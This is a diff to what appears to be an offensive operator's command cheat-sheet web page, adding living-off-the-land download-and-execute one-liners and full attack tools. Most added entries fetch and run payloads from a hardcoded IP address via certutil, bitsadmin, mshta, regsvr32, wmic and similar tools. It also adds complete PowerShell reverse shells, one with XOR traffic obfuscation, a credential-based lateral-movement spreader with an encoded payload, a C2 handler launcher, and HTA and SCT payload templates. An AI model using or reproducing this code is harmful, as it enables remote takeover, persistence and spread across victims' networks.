@@ -107,6 +107,10 @@
   .tag.lateral.active { background: #00bcd4; color: #fff; }
   .tag.playbook { color: #ffeb3b; border-color: #ffeb3b; }
   .tag.playbook.active { background: #ffeb3b; color: #000; }
+  .tag.lotl { color: #9b59b6; border-color: #9b59b6; }
+  .tag.lotl.active { background: #9b59b6; color: #fff; }
+  .tag.code { color: #00f0ff; border-color: #00f0ff; }
+  .tag.code.active { background: #00f0ff; color: #000; }
   .tag.recon { color: #4caf50; border-color: #4caf50; }
   .tag.recon.active { background: #4caf50; color: #000; }
   .tag.cloud { color: #03a9f4; border-color: #03a9f4; }
@@ -279,13 +283,12 @@ whoami         # Should show: nt authority\system</pre>
   <div class="tag persist" data-filter="persist">Persist</div>
   <div class="tag lateral" data-filter="lateral">Lateral</div>
   <div class="tag c2" data-filter="c2">C2</div>
-  <div class="tag cloud" data-filter="cloud">Cloud</div>
+  <div class="tag lotl" data-filter="lotl">LOTL</div>
+  <div class="tag code" data-filter="code">Full Code</div>
   <div class="tag chaos" data-filter="chaos">Chaos</div>
-  <div class="tag ssh" data-filter="ssh">SSH</div>
   <div class="tag ps" data-filter="ps">PowerShell</div>
   <div class="tag linux" data-filter="linux">Linux</div>
   <div class="tag vps" data-filter="vps">VPS</div>
-  <div class="tag firewall" data-filter="firewall">Firewall</div>
 </div>
 
 <div class="cmd-count" id="count">Loading...</div>
@@ -4803,6 +4806,144 @@ const COMMANDS = [
     code: "# Registry\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"WindowsUpdate\" -ErrorAction SilentlyContinue\n\n# Scheduled Task\nschtasks /delete /tn \"Windows Update\" /f 2>&1 | Out-Null\n\n# WMI\nGet-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where Name -like \"*Updater*\" | Remove-WmiObject\nGet-WmiObject __EventFilter -Namespace root\\subscription | Where Name -like \"*Updater*\" | Remove-WmiObject\nGet-WmiObject CommandLineEventConsumer -Namespace root\\subscription | Where Name -like \"*Updater*\" | Remove-WmiObject\n\nWrite-Host \"Persistence removed\"",
     tags: ["ps", "persist"],
     accent: "#00ff41"
+  },
+
+  // ═══════════════════════════════════════════════════════════════
+  // LOTL - LIVING OFF THE LAND (Built-in Windows Tools)
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[LOTL] Download with certutil",
+    desc: "Use Windows certutil to download files. Built-in, no PowerShell needed.",
+    code: "# Download file (base64 decodes automatically)\ncertutil -urlcache -split -f http://168.144.166.97:8889/payload.exe C:\\Windows\\Temp\\svc.exe\n\n# Clear cache after\ncertutil -urlcache -split -f http://168.144.166.97:8889/payload.exe delete",
+    tags: ["cmd", "evasion", "lotl"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Download with bitsadmin",
+    desc: "Background Intelligent Transfer Service. Stealthy download.",
+    code: "# Create download job\nbitsadmin /create dl\nbitsadmin /addfile dl http://168.144.166.97:8889/shell.ps1 C:\\Windows\\Temp\\s.ps1\nbitsadmin /resume dl\nbitsadmin /complete dl\n\n# One-liner:\nbitsadmin /transfer dl http://168.144.166.97:8889/shell.ps1 C:\\Windows\\Temp\\s.ps1",
+    tags: ["cmd", "evasion", "lotl"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Execute with mshta",
+    desc: "Run HTA/JS/VBS via mshta.exe. Bypasses some app controls.",
+    code: "# Run remote HTA\nmshta http://168.144.166.97:8889/payload.hta\n\n# Inline VBScript execution\nmshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/shell.ps1)\"\", 0:close\")",
+    tags: ["cmd", "evasion", "lotl"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Execute with rundll32",
+    desc: "Load DLL or run JS via rundll32. Proxy execution.",
+    code: "# Run JavaScript\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\")\n\n# Load custom DLL\nrundll32.exe payload.dll,EntryPoint",
+    tags: ["cmd", "evasion", "lotl"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Execute with regsvr32",
+    desc: "Register COM object, runs scriptlet. AppLocker bypass.",
+    code: "# Remote scriptlet (SCT file)\nregsvr32 /s /n /u /i:http://168.144.166.97:8889/payload.sct scrobj.dll\n\n# The SCT file contains JS/VBS to execute",
+    tags: ["cmd", "evasion", "lotl"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Execute with wmic",
+    desc: "WMI command-line. Process creation, lateral movement.",
+    code: "# Local process creation\nwmic process call create \"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\"\n\n# Remote execution\nwmic /node:10.0.0.220 /user:admin /password:pass process call create \"cmd /c whoami > C:\\out.txt\"",
+    tags: ["cmd", "evasion", "lotl", "lateral"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Execute with msiexec",
+    desc: "Install MSI package. Can run remote packages.",
+    code: "# Remote MSI (contains payload)\nmsiexec /q /i http://168.144.166.97:8889/payload.msi\n\n# Silent install\nmsiexec /quiet /i payload.msi",
+    tags: ["cmd", "evasion", "lotl"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Execute with cmstp",
+    desc: "Connection Manager Profile Installer. UAC bypass possible.",
+    code: "# Create INF file with command, then:\ncmstp.exe /ni /s payload.inf\n\n# INF contains: RunPreSetupCommands=cmd.exe /c powershell...",
+    tags: ["cmd", "evasion", "lotl"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Scheduled Task One-Liner",
+    desc: "Create and run task immediately. No external tools.",
+    code: "# Create + run + delete (clean)\nschtasks /create /tn X /tr \"powershell -ep bypass -enc BASE64HERE\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn X && schtasks /delete /tn X /f",
+    tags: ["cmd", "privesc", "lotl", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LOTL] Service Creation",
+    desc: "Create Windows service for persistence/privesc.",
+    code: "# Create service (needs admin)\nsc create SvcName binPath= \"cmd /c powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\" start= auto\nsc start SvcName\n\n# Cleanup\nsc stop SvcName\nsc delete SvcName",
+    tags: ["cmd", "persist", "privesc", "lotl"],
+    accent: "#9b59b6"
+  },
+
+  // ═══════════════════════════════════════════════════════════════
+  // FULL TOOL CODE - ANNOTATED
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[CODE] nc.py - Simple Listener",
+    desc: "Full code for nc.py. Edit PORT, handles reverse shells cleanly.",
+    code: "#!/usr/bin/env python3\n# nc.py - Edit PORT below\n\nPORT = 6969  # <-- CHANGE THIS\n\nimport socket, sys, threading\n\ndef recv_loop(conn):\n    # Runs in thread, prints incoming data\n    while True:\n        try:\n            data = conn.recv(4096)\n            if not data: break\n            print(data.decode('utf-8', errors='replace'), end='', flush=True)\n        except: break\n\ndef main():\n    port = int(sys.argv[1]) if len(sys.argv) > 1 else PORT\n    s = socket.socket()\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind(('0.0.0.0', port))\n    s.listen(1)\n    print(f'Listening on :{port}')\n    conn, addr = s.accept()\n    print(f'Connected: {addr[0]}:{addr[1]}\\n')\n    # Receiver thread for async output\n    t = threading.Thread(target=recv_loop, args=(conn,), daemon=True)\n    t.start()\n    # Send commands\n    try:\n        while True:\n            cmd = input()\n            conn.send((cmd + '\\n').encode())\n            if cmd == 'exit': break\n    except: pass\n    conn.close(); s.close()\n\nif __name__ == '__main__': main()",
+    tags: ["linux", "vps", "c2", "code"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[CODE] sys_shell.ps1 - Reverse Shell",
+    desc: "Full PowerShell reverse shell. Persistent reconnect, clean output.",
+    code: "# sys_shell.ps1 - Change IP/PORT below\n$IP = '168.144.166.97'\n$PORT = 4444\n\nwhile($true){\n  try{\n    # Connect to C2\n    $c = New-Object Net.Sockets.TCPClient($IP,$PORT)\n    $s = $c.GetStream()\n    $w = New-Object IO.StreamWriter($s)\n    $r = New-Object IO.StreamReader($s)\n    $w.AutoFlush = $true\n    \n    # Send banner\n    $w.WriteLine(\"[+] SYSTEM@$env:COMPUTERNAME | PID:$PID\")\n    \n    while($c.Connected){\n      $w.Write('SYSTEM> ')  # Prompt\n      $cmd = $r.ReadLine()   # Read command\n      if(-not $cmd){break}\n      if($cmd -eq 'exit'){$c.Close();break}\n      \n      # Execute and send output\n      try{$out=(iex $cmd 2>&1|Out-String)}catch{$out=$_.ToString()}\n      $w.WriteLine($out)\n    }\n    $c.Close()\n  }catch{}\n  Start-Sleep 5  # Reconnect delay\n}",
+    tags: ["ps", "c2", "code"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[CODE] shell_encrypted.ps1 - XOR Shell",
+    desc: "Full encrypted shell. XOR obfuscates traffic from network monitoring.",
+    code: "# XOR-encrypted reverse shell\n$IP = '168.144.166.97'\n$PORT = 6666\n$KEY = [byte[]](0x41,0x42,0x43,0x44)  # XOR key\n\nfunction Encrypt($data) {\n  $bytes = [Text.Encoding]::UTF8.GetBytes($data)\n  for($i=0; $i -lt $bytes.Length; $i++) {\n    $bytes[$i] = $bytes[$i] -bxor $KEY[$i % $KEY.Length]\n  }\n  return [Convert]::ToBase64String($bytes)\n}\n\nfunction Decrypt($data) {\n  $bytes = [Convert]::FromBase64String($data)\n  for($i=0; $i -lt $bytes.Length; $i++) {\n    $bytes[$i] = $bytes[$i] -bxor $KEY[$i % $KEY.Length]\n  }\n  return [Text.Encoding]::UTF8.GetString($bytes)\n}\n\nwhile($true) {\n  try {\n    $c = New-Object Net.Sockets.TCPClient($IP,$PORT)\n    $s = $c.GetStream()\n    $w = New-Object IO.StreamWriter($s)\n    $r = New-Object IO.StreamReader($s)\n    $w.AutoFlush = $true\n    $w.WriteLine((Encrypt \"[ENC] $env:USERNAME@$env:COMPUTERNAME\"))\n    while($c.Connected) {\n      $w.WriteLine((Encrypt 'ENC> '))\n      $enc_cmd = $r.ReadLine()\n      if(-not $enc_cmd){break}\n      $cmd = Decrypt $enc_cmd\n      if($cmd -eq 'exit'){break}\n      try{$out=iex $cmd 2>&1|Out-String}catch{$out=$_.ToString()}\n      $w.WriteLine((Encrypt $out))\n    }\n    $c.Close()\n  }catch{}\n  Start-Sleep 5\n}",
+    tags: ["ps", "c2", "evasion", "code"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[CODE] spread.ps1 - Lateral Movement",
+    desc: "Full spreader toolkit. WinRM, WMI, remote schtask methods.",
+    code: "# Lateral Movement Toolkit\n$C2 = '168.144.166.97'\n$B64 = 'SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbGBsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA'\n\nfunction Spread-To($Target, $User, $Pass) {\n  $SecPass = ConvertTo-SecureString $Pass -AsPlainText -Force\n  $Cred = New-Object PSCredential($User, $SecPass)\n  \n  # Try WinRM\n  try {\n    Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock {\n      param($b)\n      schtasks /create /tn X /tr \"powershell -ep bypass -enc $b\" /sc once /st 00:00 /ru SYSTEM /f\n      schtasks /run /tn X\n      schtasks /delete /tn X /f\n    } -ArgumentList $B64\n    return \"WinRM success\"\n  } catch {}\n  \n  # Try WMI\n  try {\n    Invoke-WmiMethod -ComputerName $Target -Credential $Cred -Class Win32_Process -Name Create -ArgumentList \"powershell -ep bypass -enc $B64\"\n    return \"WMI success\"\n  } catch {}\n  \n  return \"Failed\"\n}\n\n# Usage: Spread-To '10.0.0.220' 'domain\\admin' 'Password123'",
+    tags: ["ps", "lateral", "code"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[CODE] c2_launcher.sh - Start All",
+    desc: "Bash script to start all C2 handlers in tmux sessions.",
+    code: "#!/bin/bash\n# Start all C2 handlers\n\n# Kill existing\nfor s in c2_4444 c2_5555 c2_6666 c2_8080 http_server; do\n  tmux kill-session -t $s 2>/dev/null\ndone\nsleep 1\n\n# Start handlers\ntmux new-session -d -s c2_4444 'python3 /opt/c2_multi.py 4444'\ntmux new-session -d -s c2_5555 'python3 /opt/c2_tcp.py 5555'\ntmux new-session -d -s c2_6666 'python3 /opt/c2_enc_multi.py 6666'\ntmux new-session -d -s c2_8080 'python3 /opt/c2_http_multi.py 8080'\ntmux new-session -d -s http_server 'cd /opt && python3 -m http.server 8889'\n\necho 'All handlers started'\necho 'Connect: tmux attach -t c2_4444'",
+    tags: ["linux", "vps", "c2", "code"],
+    accent: "#00f0ff"
+  },
+
+  // ═══════════════════════════════════════════════════════════════
+  // PAYLOAD GENERATION
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[GEN] Create Base64 Payload",
+    desc: "Generate PowerShell base64 encoded payload for scheduled tasks.",
+    code: "# On VPS/Linux:\necho -n 'IEX(IWR http://168.144.166.97:8889/sys_shell.ps1 -UseBasicParsing)' | iconv -t UTF-16LE | base64 -w0\n\n# Result goes in:\nschtasks /create /tn X /tr \"powershell -ep bypass -enc <BASE64>\" /sc once /st 00:00 /ru SYSTEM /f",
+    tags: ["linux", "ps", "playbook"],
+    accent: "#ffee00"
+  },
+  {
+    title: "[GEN] Create HTA Payload",
+    desc: "Generate HTA file for mshta execution.",
+    code: "<html>\n<head>\n<script language=\"VBScript\">\n  Set shell = CreateObject(\"Wscript.Shell\")\n  shell.Run \"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\", 0\n  self.close\n</script>\n</head>\n</html>\n\n' Save as payload.hta, serve via HTTP\n' Execute: mshta http://IP:8889/payload.hta",
+    tags: ["lotl", "evasion", "code"],
+    accent: "#ffee00"
+  },
+  {
+    title: "[GEN] Create SCT Payload",
+    desc: "Generate SCT scriptlet for regsvr32 execution.",
+    code: "<?XML version=\"1.0\"?>\n<scriptlet>\n<registration progid=\"X\" classid=\"{00000000-0000-0000-0000-000000000000}\">\n<script language=\"JScript\">\n<![CDATA[\n  new ActiveXObject('WScript.Shell').Run('powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)',0);\n]]>\n</script>\n</registration>\n</scriptlet>\n\n' Save as payload.sct\n' Execute: regsvr32 /s /n /u /i:http://IP:8889/payload.sct scrobj.dll",
+    tags: ["lotl", "evasion", "code"],
+    accent: "#ffee00"
   },
 ];
 
